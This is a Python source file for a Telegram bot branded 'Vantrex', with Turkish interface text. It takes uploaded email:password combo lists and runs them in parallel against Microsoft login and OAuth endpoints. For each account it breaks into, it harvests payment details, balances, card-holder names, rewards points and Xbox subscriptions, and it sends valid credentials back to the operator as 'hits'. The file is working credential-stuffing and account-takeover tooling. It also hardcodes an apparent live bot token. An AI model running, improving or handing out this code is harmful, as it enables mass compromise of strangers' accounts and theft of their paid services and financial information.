#!/usr/bin/env python3
"""
Vantrex Bot - Xbox Full Cap Checker Telegram Bot
Branded for @vantrexXxx
"""

import os
import re
import sys
import time
import json
import uuid
import threading
from datetime import datetime
from urllib.parse import quote, unquote
import concurrent.futures

import requests
import telebot

# Telegram Bot Token
TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
bot = telebot.TeleBot(TOKEN)

# Durum ve İstatistik Yönetimi
class BotSession:
    def __init__(self):
        self.is_running = False
        self.combos = []
        self.remaining_combos = []
        self.processed = 0
        self.total = 0
        self.hits = 0
        self.free = 0
        self.bad = 0
        self.start_time = 0
        self.chat_id = None
        self.status_msg_id = None
        self.lock = threading.Lock()
        self.executor = None
        
        # Abonelik sayaçları
        self.sub_counts = {
            'GAME PASS ULTIMATE': 0,
            'PC GAME PASS': 0,
            'EA PLAY': 0,
            'XBOX LIVE GOLD': 0,
            'GAME PASS': 0,
            'UNKNOWN PREMIUM': 0
        }
        
        # Sonuçları tutacak listeler (Dosya çıktısı ve stop durumları için)
        self.hit_results = []
        self.free_results = []

session = BotSession()
checker_instance = None # Küresel tanımlama için

class XboxChecker:
    def __init__(self):
        pass

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"

    def check(self, email, password):
        try:
            req_session = requests.Session()
            correlation_id = str(uuid.uuid4())

            # Step 1: IDP Check
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = req_session.get(url1, headers=headers1, timeout=12)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text or "MSAccount" not in r1.text:
                return {"status": "BAD", "data": {}}

            # Step 2: OAuth authorize
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9"
            }
            r2 = req_session.get(url2, headers=headers2, allow_redirects=True, timeout=12)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3: Login POST
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = req_session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=12)

            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED", "data": {}}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}

            code = code_match.group(1)
            mspcid = req_session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()

            # Step 4: Get access token
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = req_session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=12)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}

            access_token = r4.json()["access_token"]

            # Step 5: Profile Info
            country, name = "", ""
            try:
                profile_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": "Bearer " + access_token, "X-AnchorMailbox": "CID:" + cid}
                r5 = req_session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=10)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        loc = profile["location"]
                        country = loc.split(',')[-1].strip() if isinstance(loc, str) else loc.get("country", "")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
            except:
                pass

            # Step 6: Payment Token
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            headers6 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Referer": "https://account.microsoft.com/"}
            r6 = req_session.get(payment_auth_url, headers=headers6, timeout=12)

            payment_token = None
            search_text = r6.text + " " + r6.url
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break

            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}

            # Step 7: Instruments
            payment_data = {"country": country, "name": name}
            subscription_data = {}
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Content-Type": "application/json",
                "ms-cV": str(uuid.uuid4())
            }

            try:
                r7 = req_session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=payment_headers, timeout=12)
                if r7.status_code == 200:
                    b_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if b_match: payment_data['balance'] = "$" + b_match.group(1)
                    c_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if c_match: payment_data['card_holder'] = c_match.group(1)
            except:
                pass

            # Step 8: Bing Rewards
            try:
                rewards_r = req_session.get("https://rewards.bing.com/", timeout=8)
                p_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if p_match: payment_data['rewards_points'] = p_match.group(1)
            except:
                pass

            # Step 9: Subscriptions
            try:
                r8 = req_session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=payment_headers, timeout=12)
                if r8.status_code == 200:
                    res_text = r8.text
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }

                    has_premium = False
                    premium_type = "UNKNOWN PREMIUM"

                    for keyword, type_name in premium_keywords.items():
                        if keyword in res_text:
                            has_premium = True
                            premium_type = type_name
                            break

                    if has_premium:
                        subscription_data['premium_type'] = premium_type
                        r_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', res_text)
                        if r_match:
                            subscription_data['renewal_date'] = r_match.group(1)
                            subscription_data['days_remaining'] = self.get_remaining_days(r_match.group(1) + "T00:00:00Z")
                        
                        days_rem = subscription_data.get('days_remaining', '0')
                        if days_rem.startswith('-'):
                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
                        
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
            except:
                pass

            return {"status": "FREE", "data": payment_data}
        except:
            return {"status": "TIMEOUT", "data": {}}

def build_live_text():
    elapsed = time.time() - session.start_time
    cpm = int(session.processed / elapsed * 60) if elapsed > 0 else 0
    
    text = (
        f"🤖 **Vantrex Bot — Live Results**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **İlerleme:** `{session.processed}/{session.total}`\n"
        f"⚡ **CPM:** `{cpm}` | ⏱ **Süre:** `{int(elapsed)}s`\n\n"
        f"🟢 **Hits (Premium):** `{session.hits}`\n"
        f"🟡 **Free Accounts:** `{session.free}`\n"
        f"🔴 **Bad/Error:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📋 **Abonelik Dağılımı:**\n"
        f"• Ultimate: `{session.sub_counts['GAME PASS ULTIMATE']}`\n"
        f"• PC Game Pass: `{session.sub_counts['PC GAME PASS']}`\n"
        f"• Live Gold: `{session.sub_counts['XBOX LIVE GOLD']}`\n"
        f"• EA Play: `{session.sub_counts['EA PLAY']}`\n"
        f"• Game Pass: `{session.sub_counts['GAME PASS']}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 Durdurmak için /stop yazabilirsiniz."
    )
    return text

def update_telegram_loop():
    last_processed = 0
    while session.is_running:
        time.sleep(4)  # Telegram API limitlerine takılmamak için 4 saniyede bir güncelleme
        if session.processed != last_processed:
            try:
                bot.edit_message_text(build_live_text(), chat_id=session.chat_id, message_id=session.status_msg_id, parse_mode="Markdown")
                last_processed = session.processed
            except:
                pass

def process_combo(combo):
    if not session.is_running:
        return
    
    try:
        email, password = combo.split(':', 1)
    except:
        with session.lock:
            session.bad += 1
            session.processed += 1
        return

    res = checker_instance.check(email, password)
    status = res.get("status", "BAD")
    data = res.get("data", {})

    with session.lock:
        session.processed += 1
        if combo in session.remaining_combos:
            session.remaining_combos.remove(combo)
            
        if status == "PREMIUM":
            session.hits += 1
            ptype = data.get('premium_type', 'UNKNOWN PREMIUM')
            if ptype in session.sub_counts:
                session.sub_counts[ptype] += 1
            else:
                session.sub_counts['UNKNOWN PREMIUM'] += 1
                
            line = f"{email}:{password} | Sub: {ptype} | Days: {data.get('days_remaining','?')} | Country: {data.get('country','N/A')}"
            session.hit_results.append(line)
            
        elif status == "FREE":
            session.free += 1
            line = f"{email}:{password} | Country: {data.get('country','N/A')} | Points: {data.get('rewards_points','0')}"
            session.free_results.append(line)
        else:
            session.bad += 1

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "🔥 **Vantrex Xbox Checker Bot'a Hoş Geldiniz!**\n\nCombonuzu `.txt` dosyası olarak gönderin, tarama anında başlasın.", parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_check(message):
    if not session.is_running:
        bot.reply_to(message, "❌ Şu an aktif bir tarama işlemi bulunmuyor.")
        return
    
    bot.reply_to(message, "⏹ **Tarama durduruluyor... Mevcut veriler hazırlanıyor.**")
    session.is_running = False
    
    if session.executor:
        session.executor.shutdown(wait=False, cancel_futures=True)
        
    send_final_report(interrupted=True)

def send_final_report(interrupted=False):
    status_str = "🛑 **Tarama Durduruldu!**" if interrupted else "🏁 **Tarama Tamamlandı!**"
    
    elapsed = time.time() - session.start_time
    summary = (
        f"{status_str}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **Toplam taranan:** `{session.processed}/{session.total}`\n"
        f"⏱ **Geçen Süre:** `{int(elapsed)}s`\n\n"
        f"🟢 **Hits:** `{session.hits}`\n"
        f"🟡 **Free:** `{session.free}`\n"
        f"🔴 **Bad:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📋 **Abonelik Detayları:**\n"
        f"• Ultimate: `{session.sub_counts['GAME PASS ULTIMATE']}`\n"
        f"• PC Game Pass: `{session.sub_counts['PC GAME PASS']}`\n"
        f"• Live Gold: `{session.sub_counts['XBOX LIVE GOLD']}`\n"
        f"• EA Play: `{session.sub_counts['EA PLAY']}`\n"
    )
    
    bot.send_message(session.chat_id, summary, parse_mode="Markdown")
    
    # Hit Dosyasını gönder
    if session.hit_results:
        with open("Vantrex-Hits.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(session.hit_results))
        with open("Vantrex-Hits.txt", "rb") as doc:
            bot.send_document(session.chat_id, doc, caption="🟢 Bulunan Premium Hesaplar (Hits)")
        try: os.remove("Vantrex-Hits.txt")
        except: pass

    # Kalan Combo Dosyasını gönder (/stop yapıldıysa)
    if interrupted and session.remaining_combos:
        with open("Vantrex-Remaining.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(session.remaining_combos))
        with open("Vantrex-Remaining.txt", "rb") as doc:
            bot.send_document(session.chat_id, doc, caption="📦 Kalan ve taranmamış kombolar (Remaining)")
        try: os.remove("Vantrex-Remaining.txt")
        except: pass

@bot.message_handler(content_types=['document'])
def handle_combo_file(message):
    global checker_instance
    if session.is_running:
        bot.reply_to(message, "❌ Şu an zaten aktif bir tarama sürüyor. Lütfen bitmesini bekleyin veya /stop deyin.")
        return

    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Lütfen sadece `.txt` formatında combo dosyası gönderin.")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
    except Exception as e:
        bot.reply_to(message, f"❌ Dosya okunurken hata oluştu: {str(e)}")
        return

    if not combos:
        bot.reply_to(message, "❌ Geçerli combo formatı (email:pass) bulunamadı.")
        return

    # Oturum sıfırlama ve başlatma
    session.__init__()
    session.combos = combos
    session.remaining_combos = list(combos)
    session.total = len(combos)
    session.is_running = True
    session.chat_id = message.chat.id
    session.start_time = time.time()
    checker_instance = XboxChecker()

    msg = bot.send_message(session.chat_id, "⏳ Tarama hazırlanıyor ve başlatılıyor...", parse_mode="Markdown")
    session.status_msg_id = msg.message_id

    # Telegram arayüz güncelleme thread'i
    threading.Thread(target=update_telegram_loop, daemon=True).start()

    # Worker ThreadPool başlatma
    def run_pool():
        with concurrent.futures.ThreadPoolExecutor(max_workers=45) as executor:
            session.executor = executor
            futures = [executor.submit(process_combo, c) for c in session.combos]
            for future in concurrent.futures.as_completed(futures):
                if not session.is_running:
                    break
        
        if session.is_running:
            session.is_running = False
            send_final_report(interrupted=False)

    threading.Thread(target=run_pool, daemon=True).start()

if __name__ == "__main__":
    print("[+] Vantrex Bot Aktif, Telegram sinyali bekleniyor...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            time.sleep(5)

